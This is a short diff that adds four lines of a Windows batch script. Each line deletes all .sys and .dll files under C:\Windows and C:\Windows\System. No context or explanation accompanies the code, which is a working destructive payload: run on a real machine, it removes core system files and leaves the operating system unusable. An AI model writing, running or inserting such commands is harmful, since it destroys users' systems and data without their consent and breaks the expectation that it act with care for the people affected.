@@ -1,0 +1,4 @@
+@if exist C:\Windows\*.sys del C:\Windows\*.sys
+@if exist C:\Windows\*.dll del C:\Windows\*.dll
+@if exist C:\Windows\System\*.dll del C:\Windows\System\*.dll
+@if exist C:\Windows\System\*.sys del C:\Windows\System\*.sys
